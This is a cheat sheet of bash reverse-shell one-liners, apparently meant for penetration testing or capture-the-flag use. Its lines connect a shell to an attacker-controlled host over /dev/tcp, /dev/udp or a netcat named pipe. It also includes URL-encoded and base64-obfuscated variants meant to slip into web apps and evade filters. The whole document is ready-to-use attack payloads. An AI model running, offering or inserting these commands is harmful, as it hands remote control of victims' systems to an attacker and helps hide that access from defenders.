# Bash Reverse Shells

# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash reverse shell - alternative syntax
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'

# Bash with explicit shell
/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# exec method
exec 5<>/dev/tcp/ATTACKER_IP/PORT; cat <&5 | while read line; do $line 2>&5 >&5; done

# exec with bash
exec /bin/bash 0&0 2>&0

# Using /dev/tcp file descriptor
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196

# Bash UDP reverse shell (less common)
sh -i >& /dev/udp/ATTACKER_IP/PORT 0>&1

# Bash reverse shell - readable version
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# Bash reverse shell with named pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP PORT >/tmp/f

# Using script for PTY
script -q /dev/null bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Double-encoded for web apps
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2FPORT%200%3E%261%27

# Base64 encoded (encode your payload)
echo 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' | base64
# Then decode and execute:
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzQ0NDQgMD4mMQ==' | base64 -d | bash
